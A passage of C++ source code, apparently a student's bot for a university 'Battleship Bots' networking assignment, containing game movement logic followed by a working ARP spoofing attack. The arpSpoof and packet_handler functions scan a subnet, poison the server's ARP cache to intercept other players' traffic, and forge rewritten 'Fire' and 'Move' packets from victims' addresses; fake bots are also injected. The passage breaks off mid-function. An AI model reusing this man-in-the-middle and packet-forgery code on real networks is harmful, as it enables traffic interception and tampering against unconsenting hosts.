				// > If our ally is within close proximity, increment our count
				if (allyArray[i].following) alliesTogetherCount++;
			}

			// > Take our normal movements if we're all together
			alliesTogether = (alliesTogetherCount == MAX_ALLIES);

			if (alliesTogether && isLeader)
			{
				// > Update UI
				update(20, " -> Using default movement as all allies are together.                             ");
				update(21, " -> All allies are initialised.                                                    ", closestAlly.name);
			}
			else
			{
				// > Move to our center point
				int avgX = 0, avgY = 0, count = 0;
				for (i = 0; i < allies; i++)
				{
					if (allyArray[i].health > 6)
					{
						avgX += allyArray[i].x;
						avgY += allyArray[i].y;
						count++;
					}
					else
					{
						// > Fire at our allies which are below six health
						if (canShipBeHit(allyArray[i].distance))
							fireAtShip(allyArray[i].x, allyArray[i].y);
					}
				}
				count = (count == 0 ? 1 : count); // Cannot divide by zero
				crawlToPos(avgX / count, avgY / count);

				// > Update UI
				update(21, " -> Closest Ally: %s, following!                                                   ", closestAlly.name);
			}
		}
	}

	// > Handle Enemies
	if (number_of_enemies > 0)
	{
		// > Variables
		char* packState = "(Idle State)";

		// > Is there a pack in our way
		if (checkForPacks())
		{
			// > Let's prioritise damaging the Battleships and then going for the Frigate
			Ship attackingShip = shipsInPack[0];
			int totalHealthOfPack = 0;
			for (i = 0; i < 3; i++)
				totalHealthOfPack += packHealthTotal[i];

			// > If all ships are above 8 health, ignore
			if (totalHealthOfPack > (packCount * 8))
			{
				avoidPack = !alliesTogether;
				packState = (avoidPack ? "(Avoiding Pack)" : "(Attacking Pack)");
			}
			else
			{
				// > Battleships
				if (packTypeTotal[0] > 0)
				{
					// > Check pack health totals
					// -> Battleship
					if (packHealthTotal[0] <= (4 * packTypeTotal[0]))
					{
						// > Move onto the Frigate to allow Chris & Harry to move in
						for (x = 0; x < packCount; x++)
						{
							if (shipsInPack[x].type == 1)
								attackingShip = shipsInPack[x];
						}
					}
					else
					{
						// > Find the strongest battleship
						for (x = 0; x < packCount; x++)
						{
							if (shipsInPack[x].health > attackingShip.health)
								attackingShip = shipsInPack[x];
						}
					}
				}

				// > Frigates
				if (packTypeTotal[1] > 0 || packTypeTotal[2] > 0)
				{
					// > Default code can handle this
				}

				// > Update our current pack state
				if (attackingShip.type == 0) packState = "(Attacking Battleship in Pack)";
				else if (attackingShip.type == 1) packState = "(Attacking Frigate in Pack)";
				else if (attackingShip.type == 2) packState = "(Attacking Submarine in Pack)";

				// > Update our shipStruct array
				shipStruct[0] = attackingShip;
			}

			// > Update UI
			update(23, " > Pack Total: %i ship(s), %i health total                                 ", packCount, totalHealthOfPack);
			update(24, " > Battleships: %ic, %ih - Frigates: %ic, %ih - Submarines: %ic, %ih       ", packTypeTotal[0], packHealthTotal[0], packTypeTotal[1], packHealthTotal[1], packTypeTotal[2], packHealthTotal[2]);
		}

		// > Update our UI
		updateUIColour(0);
		update(8, " > ["); updateUIColour(1); updatexy(4, 8, "ENEMY"); updateUIColour(0); updatexy(9, 8, "] Closest Enemy Details: "); updateUIColour(3); updatexy(34, 8, "%s      ", packState); updateUIColour(0);
		update(9,  " > Position:  %d, %d                                         ", shipStruct[0].x, shipStruct[0].y);
		update(10, " > Distance:  %d                                             ", shipStruct[0].distance);
		update(11, " > Health:    %d                                             ", shipStruct[0].health);
		update(12, " > Flag:      %d                                             ", shipStruct[0].flag);
		update(13, " > Ship Type: %s                                             ", getShipType(shipStruct[0].type));
		update(14, " > Hittable:  %s                                             ", (canShipBeHit(shipStruct[0].distance) ? "Yes" : "No"));

		// > Fire at our enemy if they're close enough
		if (canShipBeHit(shipStruct[0].distance - 5))
			fireAtShip(shipStruct[0].x, shipStruct[0].y);

		// > Set our flag to our enemies flag if no allies are close
		if (!checkAreAlliesNear())
			setNewFlag(shipStruct[0].flag);

		// > Check if the ship is feasible to attack
		bool feasibleToKill = false;
		bool couldWeBeHit = false;
		if (shipStruct[0].health <= me.health || me.health >= 8)
			feasibleToKill = true;

		// > Frigate Check for feasibility
		if (shipStruct[0].type == 1 && me.type == 0)
		{
			if (!canWeBeHit(shipStruct[0]))
				feasibleToKill = true;
		}

		// > Check if we could be hit by any surrounding ships
		if (me.health <= 8)
		{
			// > Let's only choose this safety option if we have 8 health or below
			for (i = 0; i < number_of_enemies; i++)
			{
				if (canWeBeHit(shipStruct[i]))
					couldWeBeHit = true;
			}
		}

		// > Move towards our enemy
		if ((!canWeBeHit(shipStruct[0]) && !avoidPack && feasibleToKill) && (!couldWeBeHit))
		{
			// > Move towards this ship
			crawlToPos(shipStruct[0].x, shipStruct[0].y);
		}
		else
		{
			// > Move away from this ship
			reverseDirectionFromShip(shipStruct[0]);
			crawlInDirection(left_right, up_down);
		}
	}

	// > Have we called our ship to respawn?
	if (shouldWeRespawn)
	{
		char extraBuffer[4096];

		// > Register our communication to the server again
		sprintf_s(extraBuffer, "Register  %s,%s,%s,%s", STUDENT_NUMBER, STUDENT_FIRSTNAME, STUDENT_FAMILYNAME, MY_SHIP);
		sendto(sock_send, extraBuffer, strlen(extraBuffer), 0, (SOCKADDR *)&sendto_addr, sizeof(SOCKADDR));

		// > Reset our flag
		shouldWeRespawn = false;
	}

	// > Forced keyboard input movement
	if (forcedMovement)
	{
		if (forceMove[0] == true)
		{
			up_down = MOVE_UP*MOVE_FAST;
		}
		else if (forceMove[1] == true)
		{
			up_down = MOVE_DOWN*MOVE_FAST;
		}

		if (forceMove[2] == true)
		{
			left_right = MOVE_LEFT*MOVE_FAST;
		}
		else if (forceMove[3] == true)
		{
			left_right = MOVE_RIGHT*MOVE_FAST;
		}

		crawlInDirection(left_right, up_down);
	}
	else
	{
		// > Reset forced movements
		for (i = 0; i < 4; i++)
			forceMove[i] = false;
	}

	// > Default movement
	if (!moveShip)
		crawlInDirection(left_right, up_down);

	// > Encrypt and update our flag
	if (!setFlag)
		encryptFlag();
}
#pragma endregion

#pragma region Dummy Bots / ARP Spoofing / Buffer Attacks
// ------------------------
// -> Dummy Bots
// ------------------------
// > Variables
arpData					 botsSpoof[NUM_BOTS];
std::vector<std::thread> bot_threads;

// > Handle all bots
void handleDummyBots()
{
	// > All threads for the bots are here
	int i;

	// > Generate all of our threads
	for (i = 0; i < NUM_BOTS; i++)
	{
		bot_threads.push_back(std::thread(&Bot::Listen, bots[i]));
	}
}

// ------------------------
// -> ARP Spoofing Attack
// ------------------------
// > Variables
arpData		spoofData[255];
bool		arpEnabled = false;
bool		isArping = false;
int			ipCount = 0;
int			getrmtmac;
u_long		tempIP = 0;
u_char		tempMac[ETH_ALEN], srv_mac[ETH_ALEN], my_mac[ETH_ALEN];
pcap_t		*adhandle;

// > ARP Spoofing Defines
#define CAP_SNAPLEN 65536
#define CAP_TIMEOUT_MS 1000
#define POISON_INTERVAL_MS 100
#define UNPOISON_RETRIES 10
#define ARP_ATTACK_STOP_MESSAGE	"1"


int arpSpoof()
{
	// > Variables
	pcap_if_t	*alldevs;
	pcap_if_t	*prevDev;
	pcap_if_t	*dev;
	char		 packet_filter[] = "ip and udp";
	char		 errbuf[PCAP_ERRBUF_SIZE];
	int			 devNumber = 0, i;
	u_char		 if_mac[ETH_ALEN], victim_mac[ETH_ALEN];
	u_long		 our_ip;
	u_int		 netmask;

	// > Find our device list from our machine
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		arpCnsl.printf("Error in pcap_findalldevs_ex: %s\n", errbuf);
		exit(1);
	}

	// > Print out our device list
	char usrInput = 'x';
	bool devPicked = false;
	for (dev = alldevs; dev != NULL || devPicked==true; dev = dev->next)
	{
		// > Fallback to close the loop
		if (devPicked) break;

		// > Update our user input and variables
		usrInput = 'x';
		prevDev = dev;

		// > Print
		arpCnsl.printf("[%d]: %s", ++devNumber, dev->name);
		if (dev->description)
			arpCnsl.printf(" (%s)\n", dev->description);
		else
			arpCnsl.printf(" (No description available)\n");

		// > Does the user want this device?
		arpCnsl.printf("-> [USER]: Would you like to listen on this device? [y/n]: ");
		while (usrInput == 'x')
		{
			switch (tolower(_getch()))
			{
				case 'y':
					usrInput = 'y';
					arpCnsl.printf("y\n");
					arpCnsl.printf("\n > You have selected Device #%i\n", devNumber);
					devPicked = true;
					Sleep(250);
					break;
				case 'n':
					arpCnsl.printf("n\n");
					usrInput = 'n';
					Sleep(250);
					break;
			}
		}
	}

	// > Print our current device
	dev = prevDev; // > Go back to our previous device
	arpCnsl.printf("\n\n-> [DEV]: Name:\n\t%s\n", dev->name);
	arpCnsl.printf("-> [DEV]: Description:\n\t%s\n", dev->description);

	// > Make sure our device is still valid
	if (dev == NULL)
	{
		// > Update UI
		arpCnsl.printf("-> [DEV]: That device was not suitable.\n");
		
		// > Free our devices
		pcap_freealldevs(alldevs);
		return 1;
	}

	// > Get the MAC Address for the device we're using
	get_if_mac(dev->name, if_mac);
	get_if_mac(dev->name, my_mac);

	// > Open the user's selected device for capturing
	if ((adhandle = pcap_open_live(dev->name,	// Name of the device
		65536,								// Portion of the packet to capture
		PCAP_OPENFLAG_PROMISCUOUS,			// Promiscuous mode
		1000,								// Read timeout
		//NULL,								// Remote authentication
		errbuf								// Error buffer
		)) == NULL)
	{
		arpCnsl.printf(" > [PCAP]: Unable to open the adapter. Not supported by WinPcap\n");
		pcap_freealldevs(alldevs);
		return -1;
	}

	// > Check the link layer. We support only Ethernet for simplicity.
	if (pcap_datalink(adhandle) != DLT_EN10MB)
	{
		fprintf(stderr, "\nThis program works only on Ethernet networks.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	if (dev->addresses != NULL)
		// > Retrieve the mask of the first address of the interface
		netmask = ((sockaddr_in *)(dev->addresses->netmask))->sin_addr.S_un.S_addr;
	else
		// > If the interface is without addresses we suppose to be in a C class network
		netmask = 0xffffff;

	// > Debug
	arpCnsl.printf("-> [LISTEN]: Listening on:\n\t%s", dev->description);
	arpCnsl.printf("-------------------------------------------------------------------------\n");

	// > Get our device's IP address
	our_ip = ((struct sockaddr_in *)dev->addresses->addr)->sin_addr.s_addr;

	// > At this point, we don't need any more the device list
	pcap_freealldevs(alldevs);

	// > Get a victim to send from
	if (get_remote_mac(adhandle, if_mac, our_ip, ARP_SERVER_IP, victim_mac) != 0) {
		arpCnsl.printf("-> [ERROR]: Couldn't find MAC address of %s\n", iptos(ARP_SERVER_IP));
		pcap_close(adhandle);
		return -3;
	}

	// > Globalise this MAC address so we can use it again to send packets from
	for (i = 0; i < 6; i++)
		srv_mac[i] = victim_mac[i];

	// > Add our predefined IP's and MAC addresses to our spoofed array
	ifstream in("2q12_ips.txt");
	string str, ip, mac;
	u_char new_mac[ETH_ALEN];
	u_long new_ip;
	size_t ip_end, mac_start;
	while (std::getline(in, str))
	{
		// > Variables
		sockaddr_in tmp;
		int temp_mac[ETH_ALEN];
		const char *temp_ip = ip.c_str();

		// > Debug
		arpCnsl.printf("[%.*s] -> ", str, str.size());

		// > Parse
		for (int i = 0; i < str.size(); i++)
		{
			if (str[i] == ',')
			{
				// > Set identifiers
				ip_end = i;
				mac_start = i + 1;

				// > Set variables
				ip = str.substr(0, ip_end);
				mac = str.substr(mac_start, (str.size() - ip_end));

				// > Set our MAC address
				sscanf_s(mac.c_str(), "%x-%x-%x-%x-%x-%x", &temp_mac[0], &temp_mac[1], &temp_mac[2], &temp_mac[3], &temp_mac[4], &temp_mac[5]);
				for (int m = 0; m < ETH_ALEN; m++)
					new_mac[m] = temp_mac[m];

				// > Set our IP Address
				tmp.sin_addr.s_addr = inet_addr(temp_ip);
				new_ip = tmp.sin_addr.s_addr; // < Grab our u_long address

				// > Stop looping
				break;
			}
		}

		// > Debug
		arpCnsl.printf("IP: %s", iptos(new_ip));
		arpCnsl.printf(" -> MAC: %s\n", mactos(new_mac));

		// > Get our ID
		int ipPart1, ipPart2, ipPart3, ipPart4;
		sscanf_s(temp_ip, "%d.%d.%d.%d", &ipPart1, &ipPart2, &ipPart3, &ipPart4);

		// > Ensure that we're not targetting allies
		if (new_ip == ARP_DEFGW_IP || new_ip == ARP_SERVER_IP || new_ip == ARP_ME_IP || new_ip == ARP_JONAS_IP || new_ip == ARP_CHRIS_IP || new_ip == ARP_HARRY_IP)
		{
			// > Do not target our allies
		}
		else
		{
			// > Add to our spoofData
			spoofData[ipCount].id = ipPart4;
			spoofData[ipCount].ip = new_ip;
			strcpy((char*)spoofData[ipCount].mac, (char*)new_mac);
			ipCount++;
		}
	}

	// > Go through all of the possible IPv4 addresses
	for (int i = 1; i <= 110; i++)
	{
		// > Variables
		tempIP = 164 + (11 << 8) + (80 << 16) + (i << 24);

		// > Ensure that we're not targetting allies
		if (tempIP == ARP_DEFGW_IP || tempIP == ARP_ME_IP || tempIP == ARP_JONAS_IP || tempIP == ARP_CHRIS_IP || tempIP == ARP_HARRY_IP)
		{
			arpCnsl.printf("-> [IPv4]: Temporary IP is equal to an allies IP, skipping...\n");
			continue;
		}

		// > There are no PC's which are over >115
		if (i > 115)
			break;

		// > Does this IP already exist?
		bool doesExist = false;
		for (int s = 0; s < ipCount; s++)
		{
			if (spoofData[s].id == i)
				doesExist = true;
		}

		// > Check that our IP has a MAC address
		if (!doesExist)
		{
			if (getrmtmac = get_remote_mac(adhandle, if_mac, our_ip, tempIP, tempMac) == 0)
			{
				// > Add our IP to a spoofed list
				spoofData[ipCount].id = i;
				spoofData[ipCount].ip = tempIP;
				strcpy((char*)spoofData[ipCount].mac, (char*)tempMac);

				// > Increment our IP counter
				ipCount++;

				// > Update UI
				arpCnsl.printf("-> [IPv4]: IP Address [%s] | MAC Address: %s\n", iptos(tempIP), mactos(tempMac));
			}
			else {
				arpCnsl.printf("-> [ERRR]: IP Address [%s] could not be found.\n", iptos(tempIP));
			}
		}
	}

	// > Clear our console
	arpCnsl.cls();

	// > Display Header
	arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_INTENSITY), "     ___       _   _   _           _     _           \n");
	arpCnsl.printf("    / __\\ __ _| |_| |_| | ___  ___| |__ (_)_ __  ___ \n");
	arpCnsl.printf("   /__\\/// _` | __| __| |/ _ \\/ __| '_ \\| | '_ \\/ __|\n");
	arpCnsl.printf("  / \\/  \\ (_| | |_| |_| |  __/\\__ \\ | | | | |_) \\__ \\\n");
	arpCnsl.printf("  \\_____/\\__,_|\\__|\\__|_|\\___||___/_| |_|_| .__/|___/\n");
	arpCnsl.printf("                                          |_|        \n");
	arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "                   Battleship Bots                   \n");
	arpCnsl.printf("        Bot created by Reece Benson - 16021424       \n");
	arpCnsl.printf("           UWE Computer and Network Systems          \n");
	arpCnsl.printf("                    Assignment  2                    \n");
	arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE), "-----------------------------------------------------\n");
	arpCnsl.update(0, "--> You can disable the ARP attack by holding 'O' <--");
	arpCnsl.update(1, "-> Number of IPs found: %i                          ");
	arpCnsl.update(2, "-----------------------------------------------------");
	arpCnsl.update(3, "-> My IP: %s                                         ", iptos(ARP_ME_IP));
	arpCnsl.update(4, "-> Server IP: %s                                     ", iptos(ARP_SERVER_IP));
	arpCnsl.update(5, "-----------------------------------------------------");
	arpCnsl.update(6 + ipCount + 1, "-----------------------------------------------------");
	arpCnsl.update(6 + ipCount + 4, "-----------------------------------------------------");

	// > Generate requests
	for (int i = 0; i < ipCount; i++)
	{
		// [CLIENT]
		generate_arp_request(spoofData[i].arpClientReq, if_mac, ARP_SERVER_IP, spoofData[i].ip);
		generate_arp_reply(spoofData[i].arpClientReply, if_mac, victim_mac, spoofData[i].ip, ARP_SERVER_IP);

		// [SERVER]
		generate_arp_request(spoofData[i].arpServReq, if_mac, spoofData[i].ip, ARP_SERVER_IP);

		// > Debug
		arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), " ");
		arpCnsl.update(6 + i, "[%s] -> Generated ARP Request...     ", iptos(spoofData[i].ip));
	}

	// > Initialise the poison of our victims
	for (int i = 0; i < ipCount; i++)
	{
		// > Send our packets
		pcap_sendpacket(adhandle, spoofData[i].arpClientReq, sizeof(spoofData[i].arpClientReq));			// < Client Request

		// > Debug to client's line
		//arpCnsl.update(6 + i, "[%s] -> Data Sent: [%.*s]             ", iptos(spoofData[i].ip), sizeof(spoofData[i].arpClientReq), spoofData[i].arpClientReq);
	}

	// > This only seems to run when the server has promiscuous mode enabled (does not spawn them in otherwise)
	if (spawningDummyBots)
	{
		// > Let's initialise our own fake bots
		for (int b = 0; b < NUM_BOTS; b++)
		{
			// > Initialise our bot to have a set IP and MAC address
			// -> Set a dummy MAC Address
			/*bots[b].MAC[0] = 0xAA;
			bots[b].MAC[1] = 0xBB;
			bots[b].MAC[2] = 0xCC;
			bots[b].MAC[3] = 0xDD;
			bots[b].MAC[4] = 0xEE;
			bots[b].MAC[5] = 0xFF;*/

			// > Check if we've gone out of our IP range
			if ((115 + b) > 250)
				continue;
			
			// > Could we spawn from a static MAC address? (take our first victim's MAC)
			strcpy((char*)spoofData[0].mac, (char*)tempMac);

			// -> Set a dummy IPv4 Address // > Using '115 + b' as no other IP's will be initialised from the range (115-254)
			bots[b].IPv4 = 164 + (11 << 8) + (80 << 16) + ((115 + b) << 24);

			// -> Tell our bot some useful data which it will use
			bots[b].SetHandler(adhandle);
			bots[b].SetServerData(ARP_SERVER_IP, srv_mac);
			bots[b].SetConsole(arpCnsl);

			// -> Create our bot
			bots[b].Create("R_Dummy", "RB_Dummy", "FAKE", (b % 3));

			// -> Poison the server to redirect packets to us which are meant to go to our dummy bot
			generate_arp_request(botsSpoof[b].arpClientReq, if_mac, ARP_SERVER_IP, bots[b].IPv4);
			//generate_arp_request(botsSpoof[b].arpServReq, bots[b].MAC, bots[b].IPv4, ARP_SERVER_IP);
		}

		// > Update UI
		arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_INTENSITY), " ");
		arpCnsl.update(6 + ipCount + 3, "[DUMMY] -> %d bots have been created and handled.\n", NUM_BOTS);

		// > Initialise the poison of our dummy bots
		for (int b = 0; b < NUM_BOTS; b++)
		{
			// > Send our packets
			pcap_sendpacket(adhandle, botsSpoof[b].arpClientReq, sizeof(botsSpoof[b].arpClientReq));			// < Client Request
			//pcap_sendpacket(adhandle, botsSpoof[b].arpServReq, sizeof(botsSpoof[b].arpServReq));				// < Server Request
		}

		// > Handle our dummy bots
		handleDummyBots();
	}

	// > Start the capture, printing and manipulating of all packets
	isArping = true;
	pcap_loop(adhandle, -1, packet_handler, NULL);

	// > Close our handle
	isArping = false;
	pcap_close(adhandle);

	return 0;
}

// > Callback function invoked by libpcap for every incoming packet
// -> Edited by Reece Benson to manipulate all packets which are redirected to us,
//    and send them to the destination with our changes
// > Toggleable Features
bool forceRespawn = false;
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
	// > Variables
	HANDLE cns = GetStdHandle(STD_OUTPUT_HANDLE);
	struct tm ltime;
	char timestr[16];
	ip_header *ih;
	udp_header *uh;
	u_int ip_len;
	u_short sport, dport;
	time_t local_tv_sec;

	// > Unused variable
	(VOID)(param);

	// > Convert the tiemstamp to a readable format
	local_tv_sec = header->ts.tv_sec;
	localtime_s(&ltime, &local_tv_sec);
	strftime(timestr, sizeof timestr, "%H:%M:%S", &ltime);

	// > Retrieve the position of the IP Header
	ih = (ip_header *)(pkt_data +
		14); // < Length of Ethernet Header

	// > Retrieve the position of the UDP Header
	ip_len = (ih->ver_ihl & 0xf) * 4;
	uh = (udp_header *)((u_char*)ih + ip_len);

	// > Convert from network byte order to host byte order
	sport = ntohs(uh->sport);
	dport = ntohs(uh->dport);

	// > Push our Source IP Header's IP address into int format
	int ipPart1, ipPart2, ipPart3, ipPart4;
	char buff[256];
	sprintf_s(buff, "%d.%d.%d.%d", ih->saddr.byte1, ih->saddr.byte2, ih->saddr.byte3, ih->saddr.byte4);
	sscanf_s(buff, "%d.%d.%d.%d", &ipPart1, &ipPart2, &ipPart3, &ipPart4);
	int ourVictimIndex = -1;
	
	// > Check if the packet contains a victim/spoof
	for (int i = 0; i < ipCount; i++)
	{
		// > Find our specific victim for this packet
		if (ipPart1 == 164 && ipPart2 == 11 && ipPart3 == 80 && ipPart4 == spoofData[i].id)
		{
			ourVictimIndex = i;
		}
	}

	// > Manipulating Variables
	int i;
	char packetBuffer[4096];
	int curIndex = 0;

	// > Start the manipulation of the packet < \\
	// > Clear our packetBuffer variable incase something has been cached
	for (i = 0; i < 4096; i++)
		packetBuffer[i] = '\0';

	// > Check if our buffer isn't what we're looking for
	if (header->caplen > 4096)
	{
		arpCnsl.printf("\n-> Received invalid data, caplen too long: %d", header->caplen);
	}
	else if (header->caplen <= 4096 && ourVictimIndex != -1)
	{
		// > Poison our victims again
		for (i = 0; i < ipCount; i++)
		{
			// > Client Request
			pcap_sendpacket(adhandle, spoofData[i].arpClientReq, sizeof(spoofData[i].arpClientReq));
		}

		// > Go through our data again and set our packetBuffer
		for (i = 1; (i < header->caplen + 1); i++)
		{
			if (pkt_data[i - 1] == '\0' || pkt_data[i - 1] == '\n' || pkt_data[i - 1] == '\a')
				packetBuffer[curIndex] = ' ';
			else
				packetBuffer[curIndex] = pkt_data[i - 1];
			curIndex++;
		}

		// > Add an escape character to the end of our buffer
		packetBuffer[i + 1] = '\0';

		// > Debug
		if (ourVictimIndex != -1)
		{
			// > Print our header
			arpCnsl.update(6 + ipCount + 5, "[VICTIM=%d>%d] [%s.%.6d len:%d/%d]: %d.%d.%d.%d:%d -> %d.%d.%d.%d:%d",
				ourVictimIndex,
				spoofData[ourVictimIndex].id,
				timestr,
				header->ts.tv_usec,
				header->caplen,
				header->len,
				ih->saddr.byte1,
				ih->saddr.byte2,
				ih->saddr.byte3,
				ih->saddr.byte4,
				sport,
				ih->daddr.byte1,
				ih->daddr.byte2,
				ih->daddr.byte3,
				ih->daddr.byte4,
				dport);

			// > Update UI
			arpCnsl.cprintf((FOREGROUND_RED | FOREGROUND_INTENSITY), " ");
			for (i = 0; i < 5; i++)
				arpCnsl.clear_eol(6 + ipCount + 6 + i);
			arpCnsl.update(6 + ipCount + 6, "[DATA] -> %s", packetBuffer);
		}

		// > Check if our buffer contains a command
		// -> Variables
		char buffer[4096];
		char *str = packetBuffer, *res;
		int current_index = 0; bool finished = false;

		// -> Check our buffer contains: FIRE
		// --> Reset variables
		current_index = 0; finished = false;

		res = strstr(str, "Fire");
		if (res != NULL)
		{
			// > Variables
			int startingIndex = (res - str);
			int length = strlen(str) - startingIndex;
			int i = 0;
			
			// > Set our current_index to the starting index
			current_index = startingIndex;
			
			// > Add our full command to a temporary buffer
			while (i < strlen(str) && !finished)
			{
				switch (packetBuffer[current_index])
				{
					case '\0': case '$':
						finished = true;
						break;
					default:
						buff[i] = packetBuffer[i + current_index];
						i++;
						break;
				}
			}
			
			// > Manipulate the "Fire" command
			char*  fireCmd = buff;									// < Move our buffer to a char* array
			int    fireCmdLength = strlen(buff);					// < Find the length of our 'fireCmd'
			char   fireCmdTemp[4096];								// < Our new 'fireCmd' will be placed into this buffer
			int    fireCmdTempLength;								// < Our length of the new 'fireCmd' will be placed into this variable
			u_char fireCmdTempUnsigned[4096];						// < Our u_char command will be placed into this buffer
			int	   fireCmdTempULen;									// < Our length of the u_char command will be placed into this variable
			
			// > Variables to pass our buffer values into
			char student_id[256]; int x, y;
			
			// > Scan our command
			sscanf_s(fireCmd, "Fire %[^,],%d,%d", student_id, _countof(student_id), &x, &y);
			//arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "[PARSE]: Student ID: %s, X: %d, Y: %d\n", student_id, x, y);
			
			// > Modify our command variables
			x = -666, y = -666;										// < Update X and Y position of the 'Fire' command
			fireCmdTempLength = strlen(fireCmdTemp);				// < Update the length of our new 'Fire' command
			
			// > Create our new command
			//arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "[MODIFY]: Student ID: %s, X: %d, Y: %d\n", student_id, x, y);
			sprintf_s(fireCmdTemp, "Fire %s,%d,%d", student_id, x, y);
			
			// > Move our command to an unsigned char buffer
			fireCmdTempULen = strlen((char*)fireCmdTempUnsigned);	// < Update our u_char length
			for (i = 0; i < fireCmdTempLength; i++)
				fireCmdTempUnsigned[i] = fireCmdTemp[i];
			
			// > Calculate the correct length of our new buffer
			for (i = 0; i < fireCmdTempULen; i++)
			{
				if (fireCmdTempUnsigned[i] == '\0')
				{
					fireCmdTempULen = i;
					break;
				}
			}
			
			// > Debug
			arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), " ");
			arpCnsl.update(6 + ourVictimIndex, "[%s] -> Tried to 'Fire', directing packet to %d,%d     ", iptos(spoofData[ourVictimIndex].ip), x, y);
			
			// > Create and send our new 'Fire' command packet from our spoofed victim
			RawPacket RP;
			RP.CreatePacket(spoofData[ourVictimIndex].mac, srv_mac, spoofData[ourVictimIndex].ip, ARP_SERVER_IP, 60666, 1924, fireCmdTempUnsigned, fireCmdTempULen);
			RP.SendPacket(adhandle);
		}

		// > Empty our buffer
		for (i = 0; i < 4096; i++)
			buffer[i] = '\0';

		// -> Check our buffer contains: MOVE
		// --> Reset variables
		current_index = 0; finished = false;

		res = strstr(str, "Move");
		if (res != NULL)
		{
			// > Variables
			int startingIndex = (res - str);
			int length = strlen(str) - startingIndex;
			int i = 0;
			
			// > Set our current_index to the starting index
			current_index = startingIndex;
			
			// > Add our full command to a temporary buffer
			while (i < strlen(str) && !finished)
			{
				switch (packetBuffer[current_index])
				{
				case '\0': case '$':
					finished = true;
					break;
				default:
					buff[i] = packetBuffer[i + current_index];
					i++;
					break;
				}
			}
			
			// > Manipulate the "Move" command
			char*  moveCmd = buff;									// < Move our buffer to a char* array
			int    moveCmdLength = strlen(buff);					// < Find the length of our 'moveCmd'
			char   moveCmdTemp[4096];								// < Our new 'moveCmd' will be placed into this buffer
			int    moveCmdTempLength;								// < Our length of the new 'moveCmd' will be placed into this variable
			u_char moveCmdTempUnsigned[4096];						// < Our u_char command will be placed into this buffer
			int	   moveCmdTempULen;									// < Our length of the u_char command will be placed into this variable
			
			// > Variables to pass our buffer values into
			char student_id[256]; int x, y;
			
			// > Scan our command
			sscanf_s(moveCmd, "Move %[^,],%d,%d", student_id, _countof(student_id), &x, &y);
			//arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "[PARSE]: Student ID: %s, X: %d, Y: %d\n", student_id, x, y);
			
			// > Modify our command variables
			x = -2, y = -2;											// < Update X and Y position of the 'Move' command to move all students to the bottom left corner
			
			// > Set our movements to our 'WASD' commands
			/* Y */ if (forceMove[0] == true) y = MOVE_UP*MOVE_FAST;
				else if (forceMove[1] == true) y = MOVE_DOWN*MOVE_FAST;
			/* X */ if (forceMove[2] == true) x = MOVE_LEFT*MOVE_FAST;
				else if (forceMove[3] == true) x = MOVE_RIGHT*MOVE_FAST;
			moveCmdTempLength = strlen(moveCmdTemp);				// < Update the length of our new 'Move' command
			
			// > Create our new command
			//arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "[MODIFY]: Student ID: %s, X: %d, Y: %d\n", student_id, x, y);
			sprintf_s(moveCmdTemp, "Move %s,%d,%d", student_id, x, y);
			
			// > Move our command to an unsigned char buffer
			moveCmdTempULen = strlen((char*)moveCmdTempUnsigned);	// < Update our u_char length
			for (i = 0; i < moveCmdTempLength; i++)
				moveCmdTempUnsigned[i] = moveCmdTemp[i];
			
			// > Calculate the correct length of our new buffer
			for (i = 0; i < moveCmdTempULen; i++)
			{
				if (moveCmdTempUnsigned[i] == '\0')
				{
					moveCmdTempULen = i;
					break;
				}
			}
			
			// > Debug
			arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), " ");
			arpCnsl.update(6 + ourVictimIndex, "[%s] -> Tried to 'Move', directing packet to %d,%d     ", iptos(spoofData[ourVictimIndex].ip), x, y);
			
			// > Create and send our new 'Move' command packet from our spoofed victim
			RawPacket RP;
			RP.CreatePacket(spoofData[ourVictimIndex].mac, srv_mac, spoofData[ourVictimIndex].ip, ARP_SERVER_IP, 60666, 1924, moveCmdTempUnsigned, moveCmdTempULen);
			RP.SendPacket(adhandle);
		}
		// > Empty our buffer
		for (i = 0; i < 4096; i++)
			buffer[i] = '\0';

		// -> Check our buffer contains: Register
		// --> Reset variables
		current_index = 0; finished = false;

		res = strstr(str, "Register");
		if (res != NULL)
		{
			// > Variables
			int startingIndex = (res - str);
			int length = strlen(str) - startingIndex;
			int i = 0;

			// > Set our current_index to the starting index
			current_index = startingIndex;

			// > Add our full command to a temporary buffer
			while (i < strlen(str) && !finished)
			{
				switch (packetBuffer[current_index])
				{
				case '\0': case '$':
					finished = true;
					break;
				default:
					buff[i] = packetBuffer[i + current_index];
					i++;
					break;
				}
			}

			// > Manipulate the "Register" command
			char*  regCmd = buff;									// < Register our buffer to a char* array
			int    regCmdLength = strlen(buff);						// < Find the length of our 'regCmd'
			char   regCmdTemp[4096];								// < Our new 'regCmd' will be placed into this buffer
			int    regCmdTempLength;								// < Our length of the new 'regCmd' will be placed into this variable
			u_char regCmdTempUnsigned[4096];						// < Our u_char command will be placed into this buffer
			int	   regCmdTempULen;									// < Our length of the u_char command will be placed into this variable

			// > Variables to pass our buffer values into
			char studentId[256], studentFName[256], studentLName[256], shipType[8];

			// > Scan our command
			sscanf_s(regCmd, "Register %[^,],%[^,],%[^,],%[^,]", studentId, _countof(studentId), studentFName, _countof(studentFName), studentLName, _countof(studentLName), shipType, _countof(shipType));
			//arpCnsl.cprintf((FOREGROUND_GREEN | FOREGROUND_INTENSITY), "[PARSE]: Student ID: %s, FName: %s, LName: %s, Type: %s\n", studentId, studentFName, studentLName, shipType);

			// > Update Variables
			char *studId, *studFName, *studLName; int studType;
